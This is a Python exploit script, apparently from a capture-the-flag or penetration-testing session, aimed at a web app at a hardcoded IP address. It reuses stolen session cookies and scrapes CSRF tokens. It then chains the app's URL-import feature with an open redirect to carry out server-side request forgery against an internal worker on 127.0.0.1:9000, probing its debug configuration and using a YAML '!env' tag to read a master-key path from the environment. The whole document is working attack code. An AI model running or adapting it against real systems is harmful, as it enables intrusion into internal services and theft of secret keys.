import requests, re, json, urllib.parse, sys
BASE=sys.argv[1] if len(sys.argv)>1 else 'http://15.252.91.100'
st=json.load(open('cn_state.json'))
S=requests.Session(); S.headers.update({'User-Agent':'Mozilla/5.0'})
for k,v in st['cookies'].items(): S.cookies.set(k,v)
def csrf(h):
    m=re.search(r'name="csrfmiddlewaretoken" value="([^"]*)"',h); return m.group(1) if m else None

def imp(url):
    r=S.get(BASE+'/import/url/'); t=csrf(r.text)
    r=S.post(BASE+'/import/url/', data={'csrfmiddlewaretoken':t,'url':url}, headers={'Referer':BASE+'/import/url/'})
    out=[]
    for m in re.finditer(r'(class="alert[^"]*"[\s\S]{0,2000}?</div>|<pre[\s\S]*?</pre>)', r.text):
        seg=re.sub(r'<[^>]+>',' ',m.group(0)); seg=re.sub(r'\s+',' ',seg).strip()
        seg=seg.replace('&#x27;',"'").replace('&quot;','"').replace('&amp;','&').replace('&lt;','<').replace('&gt;','>').replace('&#39;',"'")
        if seg and 'Paste' not in seg and 'No remote imports' not in seg: out.append(seg)
    return r, out

def via_redirect(internal):
    red=BASE+'/redirect/?url='+urllib.parse.quote(internal, safe='')
    return imp(red)

def show(label, res):
    r,out=res
    print(f'\n### {label}')
    for o in out[:4]: print('  >', o[:1500])

# 1) direct worker health via redirect bounce
show('health', via_redirect('http://127.0.0.1:9000/health'))
show('debug/config', via_redirect('http://127.0.0.1:9000/debug/config'))

# 2) parse !env MASTER_KEY_PATH
yaml1='!env MASTER_KEY_PATH'
show('parse !env MASTER_KEY_PATH', via_redirect('http://127.0.0.1:9000/debug/parse?config='+urllib.parse.quote(yaml1,safe='')))
